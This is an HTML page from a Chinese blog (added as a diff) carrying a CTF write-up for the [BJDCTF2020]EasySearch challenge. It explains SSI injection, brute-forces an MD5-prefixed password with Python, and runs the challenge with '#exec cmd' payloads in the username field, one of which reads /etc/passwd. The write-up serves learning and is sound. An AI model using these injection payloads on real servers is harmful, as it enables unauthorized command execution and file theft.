@@ -1,0 +1,373 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习26——ssi注入漏洞 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-29">2021-04-29</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习26——ssi注入漏洞</h2>
+            <div class="post-meta">
+                emm... 3500 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>这道题是一道ssi注入题，和ssti注入就差了一个字母，这说明它们两个之间还是有一定联系的。   </p>
+<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>打开题目看到一个登录界面。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608fa21cd1a9ae528f702a6b.png"><img src="https://img.imgdb.cn/item/608fa21cd1a9ae528f702a6b.png"></a>  </p>
+<p>一般这种登录界面要么是xml外部实体注入，要么是sql注入，先尝试sql注入发现没有用，那么就抓包看一下是不是xml。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608fa2e3d1a9ae528f7a1daa.png"><img src="https://img.imgdb.cn/item/608fa2e3d1a9ae528f7a1daa.png"></a>  </p>
+<p>发现也不是xml注入的格式，看了别人的wp发现原来要扫一下源码（这个细节总是会忘…），源码为index.php.swp文件。具体如下：  </p>
+<pre><code>&lt;?php
+ob_start();
+function get_hash()&#123;
+    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;
+    $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
+    $content = uniqid().$random;
+    return sha1($content); 
+&#125;
+header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+***
+if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )
+&#123;
+    $admin = &#39;6d0bc1&#39;;
+    if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;
+        echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;
+        $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;
+        $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
+        $text = &#39;
+        ***
+        ***
+        &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;
+        ***
+        ***&#39;;
+        fwrite($shtml,$text);
+        fclose($shtml);
+        ***
+        echo &quot;[!] Header  error ...&quot;;
+    &#125; else &#123;
+        echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;
+
+&#125;else
+&#123;
+***
+&#125;
+***
+?&gt;  </code></pre>
+<p>可以看出这里需要password经过md5加密后的前六位是6d0bc1  </p>
+<pre><code>$admin = &#39;6d0bc1&#39;;
+if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6))  </code></pre>
+<p>这个可以用脚本破解出来password。  </p>
+<pre><code>import hashlib
+
+for i in range(1, 100000000):
+res = hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()
+
+if res[:6] == &#39;6d0bc1&#39;:
+    print(i, res)</code></pre>
+<p>得到密码为：2020666或者2305004，我们使用第一个密码在登陆抓包看一下：  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608fa5d2d1a9ae528f9b0e4e.png"><img src="https://img.imgdb.cn/item/608fa5d2d1a9ae528f9b0e4e.png"></a>   </p>
+<p>确实登陆上去了，并且还给了我们一个url地址：  </p>
+<pre><code>public/fee23b26535c365d150e4ba8aa4559a7ff651ca4.shtml  </code></pre>
+<p>我们进入这个界面看一下：  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608fa62fd1a9ae528f9ee32f.png"><img src="https://img.imgdb.cn/item/608fa62fd1a9ae528f9ee32f.png"></a>  </p>
+<p>发现回显的就是我们输入的username的值，这里就要考虑是不是ssti注入，我们进行测试，输入username为{ {7*7} }，然后再使用它新给我们<br>的url地址来访问：  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608fa6a7d1a9ae528fa3f170.png"><img src="https://img.imgdb.cn/item/608fa6a7d1a9ae528fa3f170.png"></a>  </p>
+<p>可以看到，虽然回显，但并没和ssti一样回显49或者其他，说明这道题还不是ssti注入，这里就要学习新的知识点ssi注入了。  </p>
+<h2 id="ssi注入"><a href="#ssi注入" class="headerlink" title="ssi注入"></a>ssi注入</h2><pre><code>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令（这也就说明了为什么每次我们登录后的shtml网址都会发生变化）。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。  
+
+SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
+
+从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。  </code></pre>
+<p>以上就是ssi注入的介绍。当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：</p>
+<pre><code>Web 服务器已支持SSI（服务器端包含）
+
+Web 应用程序未对对相关SSI关键字做过滤
+
+Web 应用程序在返回响应的HTML页面时，嵌入用户输入</code></pre>
+<p>这个嵌入用户输入就和ssti一样了，都是返回了我们输入的内容。简单来说就是我们可以通过输入ssi的语法来执行命令，然后执行的结果会被返回到响应的shtml界面上，也就是我们每次登录后返回给我们的新的shtml文件url地址。  </p>
+<p>ssi注入语法有很多，这里介绍关于命令执行的语法：  </p>
+<pre><code>&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;
+
+&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;
+
+&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;
+
+&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;  </code></pre>
+<p>这道题没有过滤什么字符，我们可以直接使用，如下所示：  </p>
+<pre><code>username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=2020666  </code></pre>
+<p>这里要查看上级目录才能看到flag文件的名字：  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608faa90d1a9ae528fd06292.png"><img src="https://img.imgdb.cn/item/608faa90d1a9ae528fd06292.png"></a>  </p>
+<p>返回得到了flag文件名字，接下来就是读取该文件：  </p>
+<pre><code>username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608fab1ad1a9ae528fd57c07.png"><img src="https://img.imgdb.cn/item/608fab1ad1a9ae528fd57c07.png"></a>  </p>
+<p>得到flag。  </p>
+<p>总结一下，关于ssi注入其实和之前学过的ssti和xxs都有一些相同之处，都是会在网页上返回我们输入的相关字符，而ssi注入是通过动态页面来返回的，也就是shtml网页，我们输入的ssi语句会在服务器被执行然后会被返回到shmtl上一些信息，如果前端对我们输入的ssi敏感字符过滤不严，并且在返回的web页面上有用户输入的的字符，那么就会造成ssi漏洞。  </p>
+<p>遇到这类题，要先看一下是否存在动态页面，接着看动态页面是否返回我们输入的字符，接着就是测试字符的过滤，最后使用ssi语法来注入。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>ssi注入是一个新的注入知识，这道题可以说是入门的漏洞讲解，以后会遇到更难的，要对这类注入先做一个简单的认识，打好基础。  </p>
+<p>下面是相关学习博客：  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40657585/article/details/84260844">ssi注入漏洞</a></p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
